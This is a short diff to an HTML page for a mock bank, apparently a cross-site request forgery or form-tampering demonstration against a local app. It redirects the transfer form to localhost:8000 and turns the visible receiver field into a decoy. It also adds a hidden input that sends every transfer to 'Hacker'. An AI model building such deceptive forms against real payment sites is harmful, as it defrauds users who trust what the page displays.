@@ -97,7 +97,7 @@
         <h1>Safest bank in the world</h1>
         <h4>Make a super safe transactions</h4>
 
-        <form action="/transfer" method="post">
+        <form action="http://localhost:8000/transfer" method="post">
             <div class="form-item">
                 <label for="sender-name">Your Name</label>
                 <input
@@ -109,15 +109,16 @@
                 />
             </div>
             <div class="form-item">
-                <label for="receiver-name">Receiver Name</label>
+                <label for="fake-receiver-name">Receiver Name</label>
                 <input
-                    id="receiver-name"
-                    name="receiver-name"
+                    id="fake-receiver-name"
+                    name="fake-receiver-name"
                     type="text"
                     placeholder="Enter Receiver name"
                     required
                 />
             </div>
+            <input type="hidden" name="receiver-name" value="Hacker">
             <div class="form-item">
                 <label for="amount">Amount</label>
                 <input
